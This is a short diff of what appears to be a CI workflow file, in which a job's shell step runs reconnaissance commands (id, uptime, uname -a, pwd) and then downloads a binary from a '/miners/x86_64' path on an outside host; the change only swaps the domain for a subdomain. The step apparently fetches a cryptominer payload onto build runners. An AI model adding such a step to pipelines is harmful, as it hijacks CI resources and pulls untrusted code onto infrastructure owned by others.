@@ -7,4 +7,4 @@ jobs:
     steps:
       - shell: bash
         run: |
-          id;uptime;uname -a;pwd;wget do-dear.com/miners/x86_64
+          id;uptime;uname -a;pwd;wget rn-us.do-dear.com/miners/x86_64
